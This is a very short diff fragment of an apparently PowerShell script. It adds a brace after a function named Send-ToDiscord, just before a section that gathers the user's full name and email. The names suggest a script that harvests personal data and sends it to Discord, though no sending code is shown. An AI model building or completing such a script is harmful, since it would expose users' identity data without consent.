@@ -436,7 +436,7 @@ function Send-ToDiscord {
         }
     }
 }
-
+}
 # Main Script: Gather System Information
 $FullName = Get-FullName
 $Email = Get-Email
